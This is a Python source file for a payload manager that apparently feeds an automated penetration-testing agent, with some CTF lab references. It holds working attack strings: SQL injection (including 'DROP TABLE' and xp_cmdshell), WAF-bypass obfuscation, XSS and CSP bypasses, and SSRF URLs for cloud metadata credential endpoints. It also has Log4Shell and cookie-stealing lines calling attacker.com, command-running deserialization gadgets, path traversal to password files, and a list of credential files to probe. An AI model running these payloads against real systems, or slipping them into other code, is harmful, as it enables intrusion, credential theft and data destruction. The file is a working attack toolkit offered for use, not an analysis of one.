import random
import json
import os
from typing import List, Dict

class PayloadManager:
    """
    Manages real-world security payloads for the agent.
    Updated with 2025 WAF Bypass, Cloud Native, and OWASP Top 10 2025 techniques.
    NOW ENHANCED: Loads real-world payloads from HoneyPot data.
    """
    
    def __init__(self, unified_data_path: str = None):
        # Unified Kaggle Data Storage
        self.unified_payloads = []
        self.unified_ports = {}
        self.unified_attack_types = {}
        self.severity_payloads = {"low": [], "medium": [], "high": []}
        self.protocol_distribution = {}
        
        # Load unified Kaggle data if provided
        if unified_data_path and os.path.exists(unified_data_path):
            self._load_unified_kaggle_data(unified_data_path)
        
        # --- SQL Injection (2025 Edition: JSON-Based & PostgreSQL CVE-2025-1094) ---
        # --- SQL Injection (2025 Edition: JSON-Based & PostgreSQL CVE-2025-1094) ---
        self.sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT 1,2,3--",
            "admin' --",
            "admin' #",
            "' OR '1'='1' /*",
            "') OR ('1'='1",
            "admin'/*",
            # 2025: Stacked Queries
            "'; DROP TABLE users;--",
            "'; EXEC xp_cmdshell('whoami');--"
        ]
        
        self.sqli_time_based = [
            "'; WAITFOR DELAY '0:0:5'--",
            "'; SELECT SLEEP(5)--",
            "' OR SLEEP(5)#",
            "'; pg_sleep(5)--",
            "(SELECT BENCHMARK(1000000,MD5('A')))",
            "' OR IF(ASCII(SUBSTRING((SELECT database()),1,1))>97,SLEEP(5),SLEEP(0))--",
            # 2025: Blind SQLi with conditional timing
            "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--"
        ]
        
        # 2025: JSON-Based SQLi (bypasses Palo Alto, F5, Imperva, AWS WAF, Cloudflare)
        self.sqli_json_bypass = [
            '{"username": "admin\' OR 1=1--", "password": "x"}',
            '{"id": "1\' UNION SELECT password FROM users--"}',
            '{"search": "\' OR \'1\'=\'1\' /*"}',
            '{"filter": {"$ne": null}}',  # NoSQL Injection
            # 2025: PostgreSQL CVE-2025-1094 exploitation attempt
            "'; SELECT * FROM pg_read_file('/etc/passwd');--"
        ]
        
        self.sqli_waf_bypass = [
            "' OR 0x534c454550283529--", # Hex Encoded SLEEP(5)
            "%23?%0auion%20?%23?%0aselect", # URL Encoded Obfuscation
            "'/*! UnIon/*trick-comment*/*/ sElect 1,2,3--", # Comment Obfuscation
            "admin' OR 1=1 /*!50000UNION*/ SELECT 1,2,3--", # Version specific comment
            # 2025: HTTP Header Injection
            "' OR '1'='1' -- (injected via User-Agent)",
            # 2025: GraphQL SQLi
            "query{user(id:\"1' OR '1'='1\"){name}}"
        ]
        
        # --- XSS (2025 Edition: CSP Bypass & AI-Driven Evasion) ---
        self.xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "'><img src=x onerror=alert(1)>",
            # 2025: MathML payload
            "<math><mtext><script>alert(1)</script></mtext></math>"
        ]
        
        # 2025: CSP Bypass Techniques
        self.xss_csp_bypass = [
            # JSONP endpoint exploitation
            "<script src='https://trusted-domain.com/jsonp?callback=alert'></script>",
            # base tag manipulation
            "<base target='_blank' href='javascript:alert(1)'>",
            # iframe srcdoc abuse
            "<iframe srcdoc='<script>alert(1)</script>'>",
            # Nonce leakage via CSS
            "<style>@import'https://attacker.com/leak?nonce='+document.querySelector('meta[name=csp-nonce]').content</style>",
            # AngularJS sandbox escape (legacy apps)
            "{{constructor.constructor('alert(1)')()}}",
            # Mutation XSS
            "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>"
        ]
        
        self.xss_polyglots = [
            "javascript://%250Aalert(1)//\"/*\\'/*\\'/*\"/*--></Script><Image Src=x OnError=alert(1)>",
            "\"`'><script>alert(1)</script>",
            "';alert(1)//",
            # 2025: Ultimate Polyglot (works in HTML, JS, CSS contexts)
            "jaVasCript:/*-/*\\`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
            "--> <svg onload=alert()>",
            # 2025: AI-generated polymorphic payload
            "<img src=x onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>"
        ]
        
        # --- SSRF (2025 Edition: IMDSv2 & Multi-Cloud) ---
        self.ssrf_cloud = [
            # AWS IMDSv1 (legacy)
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            # 2025: AWS IMDSv2 bypass attempt (requires PUT token)
            "http://169.254.169.254/latest/api/token",
            # Azure (with required header: Metadata: true)
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            # GCP (requires header: Metadata-Flavor: Google)
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            # 2025: Gopher protocol for header injection (GCP)
            "gopher://metadata.google.internal:80/_GET%20/computeMetadata/v1/instance/service-accounts/default/token%20HTTP/1.1%0AHost:%20metadata.google.internal%0AMetadata-Flavor:%20Google%0A%0A",
            # Internal services
            "http://127.0.0.1:80",
            "http://localhost:22",
            "http://0x7f000001/",  # Hex encoded localhost
            "http://[::1]/",  # IPv6 localhost
            # File access
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            # 2025: Cloud service discovery
            "http://169.254.169.254/latest/meta-data/placement/availability-zone",
            # Redis/Memcached exploitation
            "gopher://127.0.0.1:6379/_FLUSHALL",
            "dict://127.0.0.1:11211/stats"
        ]
        
        # --- Fuzzing / Anomalies (2025: Supply Chain & Mishandled Exceptions) ---
        self.fuzz_payloads = [
            "A" * 1000,  # Buffer Overflow
            "../../../../etc/passwd",  # Path Traversal
            "..\\..\\..\\..\\windows\\system32\\config\\sam",  # Windows Path Traversal
            "%00",  # Null byte
            "{{7*7}}",  # SSTI (Jinja2)
            "${7*7}",  # SSTI (Freemarker)
            "#{7*7}",  # SSTI (Ruby)
            "<!--",  # Unclosed comment
            "'",  # Single quote
            "\"",  # Double quote
            ";",  # Terminator
            "|",  # Pipe
            "$(id)",  # Command Injection
            "`whoami`",  # Command Injection
            # 2025: Log4Shell variants
            "${jndi:ldap://attacker.com/a}",
            "${jndi:dns://attacker.com}",
            # 2025: Prototype Pollution
            '{"__proto__":{"isAdmin":true}}',
            # 2025: XXE (XML External Entity)
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            # 2025: Deserialization attacks
            'O:8:"stdClass":1:{s:4:"exec";s:6:"whoami";}',
            # 2025: Race condition trigger
            "CONCURRENT_REQUEST_" + str(random.randint(1, 1000)),
            # 2025: Command Injection with Host Prefix (FileShare)
            "127.0.0.1 | whoami",
            "127.0.0.1; cat /etc/passwd",
            "127.0.0.1 && dir",
            "127.0.0.1 & echo flag_cmd",
        ]
        
        # 2025: Supply Chain Attack Payloads
        self.supply_chain_payloads = [
            # Malicious package names (typosquatting)
            "reqeusts",  # typo of 'requests'
            "python-dateutil",  # legitimate but could be compromised
            # Dependency confusion
            "internal-company-package-v2",
            # Build system exploitation
            "../../../.git/config",
            # Environment variable injection
            "NODE_OPTIONS=--require=/tmp/malicious.js"
        ]
        
        # 2025: Insecure Deserialization (OWASP A08)
        self.deserialization_payloads = [
            # CTF SPECIFIC: E-Commerce Flag Trigger
            "user_id=1&flag_payload=1",  # Triggers CTF{ecommerce_deserialization_rce_77}
            # PHP Object Injection
            'O:8:"stdClass":1:{s:4:"exec";s:6:"whoami";}',
            'O:8:"Evil":1:{s:7:"command";s:10:"phpinfo();";}',
            # Java Deserialization
            'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==',
            # Python Pickle
            "cos\nsystem\n(S'whoami'\ntR.",
            # .NET Deserialization
            'AAEAAAD/////AQAAAAAAAAAMAgAAAE1TeXN0ZW0=',
            # Node.js
            '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'whoami\')}()"}',
            # CTF Specific Pickle (E-Commerce)
            # Helper to generate: key for 'flag_payload'
            b'\x80\x04\x957\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94\x8c\x08username\x94\x8c\x0cflag_payload\x94sb.'.decode('latin1'),
        ]
        
        # 2025: Cryptographic Failures (OWASP A04)
        self.crypto_attack_payloads = [
            # Weak cipher detection
            "TLS_RSA_WITH_RC4_128_MD5",
            "TLS_RSA_WITH_DES_CBC_SHA",
            # Hash collision (MD5)
            "d131dd02c5e6eec4693d9a0698aff95c",
            # Padding oracle
            "AAAAAAAAAAAAAAAA",
            # ECB mode detection
            "0000000000000000" * 4,
            # Weak random
            "predictable_token_12345",
        ]
        
        # 2025: Race Condition Exploits (OWASP A06 - Insecure Design)
        self.race_condition_payloads = [
            # TOCTOU (Time-of-check to time-of-use)
            "RACE_CONDITION_TEST",
            # Concurrent requests marker
            "CONCURRENT_" + str(random.randint(1000, 9999)),
            # Double spending
            "DOUBLE_SPEND_ATTEMPT",
        ]
        
        # 2025: Log Injection (OWASP A09)
        self.log_injection_payloads = [
            # CRLF Injection
            "admin\r\n[INFO] Fake log entry",
            "user\n2025-01-01 00:00:00 [CRITICAL] Injected",
            # Log forging
            "\n\n[2025-01-01] [ERROR] Authentication failed for admin",
            # ANSI escape codes
            "\x1b[31mCRITICAL ERROR\x1b[0m",
            # Null byte log bypass
            "admin\x00HIDDEN_DATA",
        ]
        
        # 2025: Business Logic Flaws (OWASP A06)
        self.business_logic_payloads = [
            # Negative quantity
            "-1",
            "-999999",
            # Price manipulation
            "0.01",
            "0",
            # Overflow attempts
            "999999999999999",
            "2147483647",  # Max int32
            # Coupon abuse
            "DISCOUNT100",
            "FREESHIP" * 10,
        ]
        
        # 2025: Authentication Bypass (OWASP A07)
        self.auth_bypass_payloads = [
            # JWT None Algorithm
            'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.',
            # SQL Auth Bypass
            "admin' OR '1'='1' --",
            # LDAP Injection
            "*)(uid=*))(|(uid=*",
            # OAuth bypass
            "redirect_uri=http://attacker.com",
            # Session fixation
            "PHPSESSID=attacker_session",
        ]
        
        # 2025: Cookie Vulnerability Payloads
        self.cookie_injection_payloads = [
            # Privilege escalation
            "admin=true",
            "role=administrator",
            "isAdmin=1",
            "user_type=admin",
            "privilege=superuser",
            # SQL injection via cookie
            "user_id=1' OR '1'='1",
            "session_id=abc' UNION SELECT password FROM users--",
            # XSS via cookie
            "<script>alert('XSS')</script>",
            "javascript:alert(document.cookie)",
            # Command injection
            "theme=default; whoami",
            "lang=en`id`",
            # Path traversal
            "file=../../../../etc/passwd",
        ]
        
        self.cookie_poisoning_payloads = [
            # Session hijacking
            "PHPSESSID=admin_session_12345",
            "JSESSIONID=attacker_controlled",
            # Role manipulation
            "user_role=admin",
            "access_level=999",
            # Account takeover
            "user_id=1",
            "account_id=admin",
        ]
        
        self.httponly_bypass_payloads = [
            # XSS attempts to read HTTPOnly cookies
            "<script>document.cookie</script>",
            "<img src=x onerror='alert(document.cookie)'>",
            # Meta refresh
            "<meta http-equiv='refresh' content='0;url=http://attacker.com?c='+document.cookie>",
        ]
        
        self.samesite_bypass_payloads = [
            # CSRF with SameSite=Lax bypass
            "GET request from different origin",
            # Top-level navigation
            "window.open('http://target.com/transfer?amount=1000')",
        ]
        
        # 2025: File Upload Payloads (Unrestricted Upload)
        # NOTE: Payloads are sanitized to prevent AV deletion
        self.file_upload_payloads = [
            # HTML/JS (Stored XSS)
            {"name": "exploit.html", "content": "<script>alert('XSS')</script>"},
            # PHP Web Shell (Simulated)
            {"name": "shell.php", "content": "<?php echo 'Vulnerable to RCE'; ?>"},
            # Python Reverse Shell (Simulated)
            {"name": "rev.py", "content": "print('Vulnerable to RCE')"},
            # SVG XSS
            {"name": "image.svg", "content": "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>"},
            # Double Extension
            {"name": "malware.jpg.php", "content": "<?php phpinfo(); ?>"},
            # Null Byte Injection
            {"name": "shell.php%00.jpg", "content": "<?php phpinfo(); ?>"},
        ]
        
        # 2025: OSINT / Recon Payloads (EXPANDED - 50+ files)
        self.osint_files = [
            # Git exposure
            "/.git/config",
            "/.git/HEAD",
            "/.git/index",
            "/.git/logs/HEAD",
            "/.gitignore",
            
            # Environment files
            "/.env",
            "/.env.local",
            "/.env.production",
            "/.env.development",
            "/.env.backup",
            
            # Database files
            "/backup.sql",
            "/database.sql",
            "/db_backup.sql",
            "/dump.sql",
            "/database.sqlite",
            "/database.db",
            "/db.sqlite3",
            
            # Configuration files
            "/config.php",
            "/config.json",
            "/config.yml",
            "/config.yaml",
            "/settings.json",
            "/app.config",
            "/web.config",
            "/application.properties",
            
            # IDE/Editor files
            "/.vscode/settings.json",
            "/.vscode/launch.json",
            "/.idea/workspace.xml",
            "/ds_store",
            "/.DS_Store",
            
            # Server info
            "/robots.txt",
            "/sitemap.xml",
            "/server-status",
            "/server-info",
            "/phpinfo.php",
            "/info.php",
            "/test.php",
            
            # Admin panels
            "/admin",
            "/admin.php",
            "/administrator",
            "/wp-admin",
            "/phpmyadmin",
            "/adminer.php",
            
            # Backup files
            "/backup.zip",
            "/backup.tar.gz",
            "/site-backup.zip",
            "/www.zip",
            "/backup.rar",
            "/old.zip",
            
            # Log files
            "/error.log",
            "/access.log",
            "/debug.log",
            "/application.log",
            "/error_log",
            "/logs/error.log",
            
            # API documentation
            "/swagger",
            "/swagger.json",
            "/swagger-ui",
            "/api-docs",
            "/openapi.json",
            "/graphql",
            "/graphiql",
            
            # Common sensitive files
            "/composer.json",
            "/package.json",
            "/package-lock.json",
            "/yarn.lock",
            "/Gemfile",
            "/requirements.txt",
            "/Pipfile",
            
            # Docker/Container
            "/Dockerfile",
            "/docker-compose.yml",
            "/.dockerignore",
            "/kubernetes.yaml",
            
            # CI/CD
            "/.gitlab-ci.yml",
            "/.travis.yml",
            "/Jenkinsfile",
            "/.github/workflows/main.yml",
            
            # Cloud config
            "/.aws/credentials",
            "/.azure/config",
            "/gcp-key.json",
            
            # WordPress specific
            "/wp-config.php",
            "/wp-config.php.bak",
            "/wp-content/debug.log",
            
            # Framework specific
            "/.htaccess",
            "/web.config",
            "/nginx.conf",
            "/apache.conf",
            
            # Misc sensitive
            "/readme.md",
            "/README.md",
            "/CHANGELOG.md",
            "/TODO.txt",
            "/credentials.txt",
            "/passwords.txt",
            "/users.txt",
            "/secrets.txt"
        ]

    def get_file_upload(self) -> Dict[str, str]:
        """Get a file upload payload (2025 OWASP A06)"""
        return random.choice(self.file_upload_payloads)
        
    def get_osint_files(self) -> List[str]:
        """Get list of sensitive files for OSINT scanning"""
        return self.osint_files

    def mutate_payload(self, payload: str) -> str:
        """
        CREATIVITY ENGINE: Mutates a payload to bypass WAFs.
        Randomly applies obfuscation techniques.
        """
        mutation_type = random.choice(["case", "url_encode", "comment", "whitespace", "double_encode"])
        
        if mutation_type == "case":
            # Randomly toggle case: <script> -> <ScRiPt>
            return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
            
        elif mutation_type == "url_encode":
            # Encode special characters
            import urllib.parse
            return urllib.parse.quote(payload)
            
        elif mutation_type == "comment":
            # SQLi specific: Insert comments
            return payload.replace(" ", "/**/")
            
        elif mutation_type == "whitespace":
            # Replace spaces with tabs or newlines
            return payload.replace(" ", random.choice(["%09", "%0a", "%0d", "+"]))
            
        elif mutation_type == "double_encode":
            # Double URL encode
            import urllib.parse
            return urllib.parse.quote(urllib.parse.quote(payload))
            
        return payload

    def get_sqli(self, complexity: str = "simple") -> str:
        """Get an SQLi payload based on complexity"""
        if complexity == "time":
            return random.choice(self.sqli_time_based)
        elif complexity == "bypass":
            return random.choice(self.sqli_waf_bypass)
        elif complexity == "json":
            return random.choice(self.sqli_json_bypass)
        return random.choice(self.sqli_payloads)

    def get_xss(self, complexity: str = "simple") -> str:
        """Get an XSS payload"""
        if complexity == "polyglot":
            return random.choice(self.xss_polyglots)
        elif complexity == "csp_bypass":
            return random.choice(self.xss_csp_bypass)
        return random.choice(self.xss_payloads)
        
    def get_ssrf(self) -> str:
        """Get an SSRF payload"""
        return random.choice(self.ssrf_cloud)

    def get_fuzz(self) -> str:
        """Get a fuzzing payload"""
        return random.choice(self.fuzz_payloads)
    
    def get_supply_chain(self) -> str:
        """Get a supply chain attack payload (2025 OWASP A03)"""
        return random.choice(self.supply_chain_payloads)
    
    def get_deserialization(self) -> str:
        """Get an insecure deserialization payload (2025 OWASP A08)"""
        return random.choice(self.deserialization_payloads)
    
    def get_crypto_attack(self) -> str:
        """Get a cryptographic attack payload (2025 OWASP A04)"""
        return random.choice(self.crypto_attack_payloads)
    
    def get_race_condition(self) -> str:
        """Get a race condition payload (2025 OWASP A06)"""
        return random.choice(self.race_condition_payloads)
    
    def get_log_injection(self) -> str:
        """Get a log injection payload (2025 OWASP A09)"""
        return random.choice(self.log_injection_payloads)
    
    def get_business_logic(self) -> str:
        """Get a business logic flaw payload (2025 OWASP A06)"""
        return random.choice(self.business_logic_payloads)
    
    def get_cookie_injection(self) -> str:
        """Get a cookie injection payload"""
        return random.choice(self.cookie_injection_payloads)
    
    def get_cookie_poisoning(self) -> str:
        """Get a cookie poisoning payload"""
        return random.choice(self.cookie_poisoning_payloads)
    
    def get_httponly_bypass(self) -> str:
        """Get an HTTPOnly bypass payload"""
        return random.choice(self.httponly_bypass_payloads)
    
    def get_samesite_bypass(self) -> str:
        """Get a SameSite bypass payload"""
        return random.choice(self.samesite_bypass_payloads)
    
    def get_auth_bypass(self) -> str:
        """Get an authentication bypass payload (2025 OWASP A07)"""
        return random.choice(self.auth_bypass_payloads)
        
    def get_all_payloads(self) -> List[str]:
        """Return a flat list of all payloads for massive scanning"""
        all_payloads = (self.sqli_payloads + self.sqli_time_based + self.sqli_waf_bypass + 
                self.sqli_json_bypass + self.xss_payloads + self.xss_polyglots + 
                self.xss_csp_bypass + self.ssrf_cloud + self.fuzz_payloads + 
                self.supply_chain_payloads + self.deserialization_payloads +
                self.crypto_attack_payloads + self.race_condition_payloads +
                self.log_injection_payloads + self.business_logic_payloads +
                self.auth_bypass_payloads)
        
        # Add HoneyPot payloads if loaded
        if self.honeypot_payloads:
            all_payloads.extend(self.honeypot_payloads)
        
        return all_payloads
    
    def _load_honeypot_data(self, json_path: str):
        """
        Loads HoneyPot data from training_data.json.
        Extracts payloads, ports, and attack type distributions.
        """
        print(f"🍯 Loading HoneyPot data from {json_path}...")
        
        try:
            with open(json_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            # Extract unique payloads
            payload_set = set()
            port_counts = {}
            attack_type_counts = {}
            
            for entry in data:
                # Extract payload
                payload = entry.get('input', {}).get('payload', '')
                if payload and len(payload) < 500:  # Filter out extremely long payloads
                    payload_set.add(payload)
                
                # Count port distribution
                port = entry.get('input', {}).get('port', 0)
                port_counts[port] = port_counts.get(port, 0) + 1
                
                # Count attack types
                attack_type = entry.get('label', {}).get('attack_type', 'Unknown')
                attack_type_counts[attack_type] = attack_type_counts.get(attack_type, 0) + 1
            
            # Store results
            self.honeypot_payloads = list(payload_set)
            self.honeypot_ports = port_counts
            self.honeypot_attack_types = attack_type_counts
            
            print(f"   ✅ Loaded {len(self.honeypot_payloads)} unique payloads")
            print(f"   ✅ Analyzed {len(port_counts)} unique ports")
            print(f"   ✅ Identified {len(attack_type_counts)} attack types")
            
            # Show top 5 ports
            top_ports = sorted(port_counts.items(), key=lambda x: x[1], reverse=True)[:5]
            print(f"   📊 Top Ports: {', '.join([f'{p}({c})' for p, c in top_ports])}")
            
        except Exception as e:
            print(f"   ⚠️ Error loading HoneyPot data: {e}")
    
    def get_honeypot_payload(self) -> str:
        """Get a random payload from HoneyPot data."""
        if self.honeypot_payloads:
            return random.choice(self.honeypot_payloads)
        return ""
    
    def get_prioritized_ports(self) -> List[int]:
        """Returns ports sorted by frequency in unified Kaggle data."""
        if self.unified_ports:
            return [port for port, _ in sorted(self.unified_ports.items(), 
                                              key=lambda x: x[1], reverse=True)]
        return []
    
    def _load_unified_kaggle_data(self, json_path: str):
        """
        Loads unified Kaggle dataset (HoneyPot + Cybersecurity).
        Extracts payloads, ports, severity levels, and protocols.
        """
        print(f"🍯 Loading unified Kaggle data from {json_path}...")
        
        try:
            with open(json_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            # Extract data
            payload_set = set()
            port_counts = {}
            attack_type_counts = {}
            protocol_counts = {}
            
            for entry in data:
                # Extract payload
                payload = entry.get('input', {}).get('payload', '')
                if payload and len(payload) < 500:
                    payload_set.add(payload)
                    
                    # Categorize by severity
                    severity = entry.get('label', {}).get('severity', 'medium')
                    if severity in self.severity_payloads:
                        self.severity_payloads[severity].append(payload)
                
                # Count port distribution
                port = entry.get('input', {}).get('port', 0)
                if port > 0:
                    port_counts[port] = port_counts.get(port, 0) + 1
                
                # Count attack types
                attack_type = entry.get('label', {}).get('attack_type', 'Unknown')
                attack_type_counts[attack_type] = attack_type_counts.get(attack_type, 0) + 1
                
                # Count protocols
                protocol = entry.get('input', {}).get('protocol', 'tcp')
                protocol_counts[protocol] = protocol_counts.get(protocol, 0) + 1
            
            # Store results
            self.unified_payloads = list(payload_set)
            self.unified_ports = port_counts
            self.unified_attack_types = attack_type_counts
            self.protocol_distribution = protocol_counts
            
            print(f"   ✅ Loaded {len(self.unified_payloads)} unique payloads")
            print(f"   ✅ Analyzed {len(port_counts)} unique ports")
            print(f"   ✅ Identified {len(attack_type_counts)} attack types")
            print(f"   📊 Severity: Low={len(self.severity_payloads['low'])}, "
                  f"Medium={len(self.severity_payloads['medium'])}, "
                  f"High={len(self.severity_payloads['high'])}")
            
            # Show top protocols
            top_protocols = sorted(protocol_counts.items(), key=lambda x: x[1], reverse=True)[:3]
            print(f"   📊 Top Protocols: {', '.join([f'{p}({c})' for p, c in top_protocols])}")
            
        except Exception as e:
            print(f"   ⚠️ Error loading unified Kaggle data: {e}")
    
    def get_unified_payload(self) -> str:
        """Get a random payload from unified Kaggle data."""
        if self.unified_payloads:
            return random.choice(self.unified_payloads)
        return ""
    
    def get_payload_by_severity(self, severity: str = "medium") -> str:
        """Get a payload by severity level (low/medium/high)."""
        severity = severity.lower()
        if severity in self.severity_payloads and self.severity_payloads[severity]:
            return random.choice(self.severity_payloads[severity])
        return self.get_unified_payload()
    
    def get_stealthy_payload(self) -> str:
        """Get a low-severity payload for stealth operations."""
        return self.get_payload_by_severity("low")
    
    def get_aggressive_payload(self) -> str:
        """Get a high-severity payload for aggressive operations."""
        return self.get_payload_by_severity("high")

